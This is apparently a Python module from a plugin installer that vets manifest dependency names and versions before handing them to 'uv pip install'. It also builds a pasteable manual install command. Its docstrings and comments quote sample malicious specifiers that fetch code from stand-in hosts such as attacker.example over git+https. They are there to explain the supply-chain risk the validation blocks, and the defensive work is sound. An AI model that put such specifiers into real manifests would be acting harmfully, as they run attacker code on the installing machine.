"""``[python_deps]``, vetted before it can reach a package installer.

This is the narrowest and least negotiable rule in the package. A manifest's
``[python_deps]`` table is written by whoever wrote the plugin, and the
installer hands it to ``uv pip install`` -- so ``evil = "@ git+https://
attacker.example/evil"`` is arbitrary code execution through the dependency
resolver, running the attacker's ``setup.py`` no matter how strict the AST
gate over the plugin's own files was. No shell is involved and none is
needed: ``uv`` will fetch a URL specifier if you give it one.

So a name and a version constraint are matched against two deliberately
conservative patterns and anything else is refused BY NAME. Refusing is not
filtering: the offending key travels back to the caller, because "one of
your dependencies was dropped" is how a plugin ends up half-installed and
failing on its first import instead of at the point somebody could fix it.

:func:`install_deps_step` is where a vetted spec finally becomes an install,
and it goes through the Package Center's runner rather than a ``uv`` line of
its own. That is not tidiness: the constraints file that runner writes pins
every distribution THIS interpreter has already imported, which turns the
install ADD-ONLY -- a plugin asking for ``numpy<2`` can no longer downgrade
the numpy the running server is holding open, silently, under a learner who
only wanted one more node. When the resolver says it cannot be done under
those pins, that is not a broken plugin: it is "not while the server is
running", and :class:`~.errors.PluginNeedsRestart` carries the command to
type instead.
"""

from __future__ import annotations

import importlib
import re
import sys
import tempfile
from collections.abc import Callable, Sequence
from pathlib import Path

from app.core.packs import runner as packs_runner
from app.core.packs.constraints import write_constraints_file
from app.core.packs.errors import PackCancelled

from .errors import PluginCancelled, PluginInstallError, PluginNeedsRestart

# PEP 508 distribution names: letters / digits / underscore / hyphen / period.
# Anything else (especially ``@``, ``git+``, ``http``, whitespace, semicolon)
# is rejected to block supply-chain RCE via the dep installer
# (``"evil @ git+https://attacker.com/evil"`` -> ``uv pip install`` runs the
# attacker's ``setup.py`` regardless of how strict the AST gate is).
_SAFE_DEP_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,62}$")

# PEP 440 version specifier characters. We don't fully parse -- we just refuse
# anything that *isn't* whitespace, digits, dots, commas, parens, and the
# canonical comparison operators.
_SAFE_DEP_VERSION = re.compile(r"^[\s\d.,()<>=!~*+a-zA-Z\-]*$")


class _UnsafeDepSpec(ValueError):
    """Raised when a plugin manifest's python_deps entry isn't a plain
    distribution name + version constraint."""


def is_safe_dep_name(name: object) -> bool:
    """Whether *name* is a distribution name this build will put on a
    command line at all.

    Public because the rule has a second reader. An uninstall reports the
    packages a plugin left behind and hands over the ``uv pip uninstall``
    line for them (``lifecycle._declared_python_deps``), and that name comes
    out of the same untrusted manifest table :func:`dep_specs` vets -- so a
    name that could never have been INSTALLED must not be able to reach a
    command the user is invited to paste into a shell either. One predicate
    rather than two copies of the pattern: an install and an uninstall
    disagreeing about what counts as a name is exactly the drift the regex
    exists to prevent.

    ``fullmatch``, not ``match``: ``$`` also matches just BEFORE a final
    newline, so ``"tabulate\\n"`` passed a pattern anchored at both ends.
    A name is a manifest key, and one carrying a newline is a second line in
    every place a name is printed -- including ``uninstall_command``, where
    the shell reads the tail as a command of its own.
    """
    return isinstance(name, str) and _SAFE_DEP_NAME.fullmatch(name) is not None


def _build_dep_spec(name: str, ver: str) -> str:
    """Turn a (name, version) pair into a vetted ``foo==1.2.3``-style string.

    Rejects PEP 508 extras (``foo[extra]``), URL specifiers (``foo @ url``),
    and any name with non-distribution-safe characters. Returning the spec as
    a list element for ``uv pip install`` is safe because we never invoke a
    shell -- but ``uv`` itself would happily fetch ``git+`` URLs given the
    chance, and that's exactly what we're blocking here.
    """
    if not is_safe_dep_name(name):
        raise _UnsafeDepSpec(
            f"Invalid python_deps name {name!r} -- must match {_SAFE_DEP_NAME.pattern!r}"
        )
    if not isinstance(ver, str):
        ver = ""
    if ver and not _SAFE_DEP_VERSION.match(ver):
        raise _UnsafeDepSpec(
            f"Invalid python_deps version constraint for {name!r}: {ver!r}"
        )
    if not ver:
        return name
    if ver[:1] in (">", "<", "=", "~", "!"):
        return f"{name}{ver}"
    return f"{name}=={ver}"


def dep_specs(deps: dict[str, str]) -> list[str]:
    """Every dependency of a manifest as a vetted install spec, in order.

    Raises :class:`~.errors.PluginInstallError` on the first entry that does
    not vet, with the offending key as the ``hint`` -- a dialog can then
    point at the line of the manifest to fix instead of asking its reader to
    match a name out of a sentence.

    Order is the manifest's. Nothing here resolves or sorts anything: the
    installer is entitled to show the list it is about to install and have it
    read like the table it came from.
    """
    specs: list[str] = []
    for name, ver in deps.items():
        try:
            specs.append(_build_dep_spec(name, ver))
        except _UnsafeDepSpec as exc:
            raise PluginInstallError(str(exc), hint=str(name)) from exc
    return specs


#: An argument every shell passes through untouched. Copied from
#: ``packs.flows._shell_quote`` rather than imported: this package may depend
#: on ``packs.runner`` and ``packs.constraints`` and on nothing else in that
#: package, and ``packs.flows`` drags the model downloader, the pack catalog
#: and the sentinel state in behind it. See that module for why the test is
#: inverted -- an unquoted ``>`` is redirection in every shell, and Git Bash
#: eats the backslashes of an unquoted Windows path.
_BARE_ARGUMENT = re.compile(r"[A-Za-z0-9._/:+-]+")


def _shell_quote(part: str) -> str:
    """One argument of a command line a human is going to paste."""
    return part if _BARE_ARGUMENT.fullmatch(part) else f'"{part}"'


def manual_install_command(specs: Sequence[str]) -> str:
    """The line that installs *specs* with this server stopped.

    Spelled out in full rather than named as a flag, because no flag
    installs a plugin's dependencies into a stopped server: pointing at one
    would send the user to an exit code instead of to a working install. The
    constraints file is deliberately absent -- it pins what this process has
    already imported, which is the very thing the resolver has just said it
    needs to replace.

    Public because the CLI prints it beside its own exit code and the panel
    shows it in a dialog, and a command spelled two ways is a command one of
    them gets wrong.
    """
    argv = ["uv", "pip", "install", "--python", sys.executable, *specs]
    return " ".join(_shell_quote(part) for part in argv)


def install_deps_step(
    specs: Sequence[str],
    *,
    emit: Callable[[dict], None],
    cancel_check: Callable[[], bool],
) -> None:
    """Install *specs* into this interpreter, add-only, as one job step.

    Emits its own ``step_started`` / ``step_done`` pair -- the caller passes
    *emit* through rather than wrapping the call -- because the failure
    modes below decide whether the step finished at all, and a wrapper that
    closed the step from outside would report a resolver conflict as a
    completed one.

    Add-only: the constraints file is written per call and thrown away with
    it, because it describes THIS interpreter at THIS moment and caching it
    would pin an install to a machine state that has since changed.

    Three ways out, and the caller's answer differs for each:

    * a resolver conflict -- uv would have to replace a package this process
      is holding open -- is :class:`~.errors.PluginNeedsRestart` carrying the
      command to run with the server stopped;
    * any other non-zero exit is a :class:`~.errors.PluginInstallError` with
      uv's last lines as the ``hint``, which is what a learner pastes into
      an issue -- and when there are none, the last lines this step LOGGED,
      because the one failure that pumps no output (uv is not on PATH, so
      there is no process at all) is also the one whose cause is a single
      sentence;
    * a cancel becomes :class:`~.errors.PluginCancelled`. The runner raises
      the Package Center's ``PackCancelled``, and letting THAT out of a
      plugin install would reach a job runner whose terminal mapping has
      never heard of it -- a stopped install reported as a crash.

    ``importlib.invalidate_caches()`` runs on every one of those ways out,
    not only the successful one: the directory listings Python cached before
    this ran do not have the packages that were just written in them, and uv
    installs in dependency order and stops at the first failure -- so a run
    that failed, or one the user stopped, has usually written some of them
    anyway. Skipping it there would leave this process importing from a
    picture taken before the install.
    """
    emit({"type": "step_started", "step": "deps",
          "label": f"Installing packages: {', '.join(specs)}"})

    tail: list[str] = []
    logged: list[str] = []

    def _watched(event: dict) -> None:
        # The failure with the most nameable cause is the one that filled
        # ``tail`` least: when uv is not on PATH there is no process, so
        # nothing is ever pumped into ``tail`` -- and the one line that says
        # what happened went out through ``emit`` and nowhere else, leaving
        # the hint empty exactly where it had something to say.
        if event.get("type") == "log" and isinstance(event.get("line"), str):
            logged.append(event["line"])
            del logged[:-packs_runner.TAIL_LINES]
        emit(event)

    try:
        returncode = _run_uv(
            specs, emit=_watched, cancel_check=cancel_check, tail=tail
        )
    finally:
        # Whatever happened. uv installs in dependency order and stops at the
        # first failure, so a run that failed -- or one the user stopped --
        # has usually written some of these packages already, and the
        # directory listings Python cached before it ran do not have them in.
        # The very next import in this process would answer from a picture
        # taken before the install.
        importlib.invalidate_caches()

    if returncode != 0:
        detail = "\n".join(tail).strip() or "\n".join(logged).strip()
        if packs_runner.looks_like_resolver_conflict(tail):
            command = manual_install_command(specs)
            raise PluginNeedsRestart(
                "This plugin's Python packages cannot be installed while the "
                "server is running: they would have to replace a package it "
                "is already using",
                command=command,
                hint=f"stop the server, then run:\n{command}\n\n{detail}",
            )
        raise PluginInstallError(
            f"installing the plugin's Python packages failed "
            f"(uv exited {returncode})",
            hint=detail,
        )

    emit({"type": "step_done", "step": "deps"})


def _run_uv(
    specs: Sequence[str],
    *,
    emit: Callable[[dict], None],
    cancel_check: Callable[[], bool],
    tail: list[str],
) -> int:
    """Run uv under a constraints file written for this call, and only this one.

    The file describes THIS interpreter at THIS moment, so caching it would
    pin an install to a machine state that has since changed -- which is why
    it is written into a directory that goes away with the call.
    """
    with tempfile.TemporaryDirectory(prefix="codefyui-plugin-deps-") as workdir:
        # uv runs in the throwaway directory the constraints file lives in.
        # A plugin's dependencies are not this project's, so the cwd must not
        # let uv discover the backend as a project to read configuration
        # from; the specs are vetted names and versions, so nothing in them
        # resolves relative to a directory anyway, and an empty one is the
        # single cwd that cannot mean something.
        workdir_path = Path(workdir)
        constraints_path = write_constraints_file(workdir_path)
        try:
            return packs_runner.run_pip(
                specs,
                constraints_path=constraints_path,
                emit=emit,
                cancel_check=cancel_check,
                cwd=workdir_path,
                tail=tail,
            )
        except PackCancelled as exc:
            raise PluginCancelled(str(exc)) from exc
